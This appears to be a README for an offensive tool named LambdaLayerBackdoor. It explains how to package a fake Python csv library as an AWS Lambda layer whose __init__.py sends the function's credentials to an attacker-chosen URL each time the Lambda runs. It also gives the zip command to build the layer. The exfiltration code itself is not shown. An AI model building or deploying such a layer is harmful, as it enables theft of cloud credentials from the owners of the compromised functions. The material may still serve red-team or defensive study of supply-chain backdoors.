# LambdaLayerBackdoor

This backdoor is prepared to backdor the load of csv library.

Requisites:

1. The orginical code is loading csv
2. Set this layer in the lambda loading that library
3. Each time the lambda is called the indicated URL in `python/lib/python3.9/site-packages/csv/__init__.py` will receive the credentials (feel free to change the payload)

```bash
zip -r backdoor.zip python
```
